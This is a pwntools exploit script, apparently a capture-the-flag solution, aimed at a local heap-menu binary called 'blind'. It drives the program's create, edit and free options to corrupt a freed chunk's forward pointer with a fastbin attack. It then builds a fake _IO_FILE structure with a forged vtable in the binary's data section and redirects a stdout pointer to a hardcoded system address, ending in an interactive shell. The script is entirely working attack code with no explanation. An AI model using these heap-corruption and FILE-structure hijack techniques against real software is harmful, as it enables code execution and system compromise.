from pwn import *
context.log_level = 'debug'
p = process('./blind')

def new(index,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.sendline(content)

def change(index,content):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(content)

def release(index):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def g():
    gdb.attach(p)
    raw_input()

new(0,'aaaa')
new(1,'bbbb')


release(0)
release(1)
change(1,p64(0x60201d) + '\n') 


new(3,'aaaa')
system_addr = 0x4008e3
payload = 'aaa' + 'a'*0x30
payload += p64(0x602020) + p64(0x602090) + p64(0x602090 + 0x68)
payload += p64(0x602090 + 0x68*2) + p64(0x602090 + 0x68*3)
new(4,payload)


payload = p64(0x00000000fbad8000) + p64(0x602060)*7 
payload += p64(0x602061) + p64(0)*4  
change(1,payload)


payload = p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff) + p64(0)
payload += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060)
payload += p64(0)*3 + p64(0x00000000ffffffff) + p64(0)
change(2,payload)


payload =  p64(0) + p64(0x602090 + 0x68*3) + '\n'
change(3,payload)

payload = 'a'*56 + p64(system_addr) + '\n'
change(4,payload)

payload = p64(0x602090) + '\n'
change(0,payload)

p.interactive()
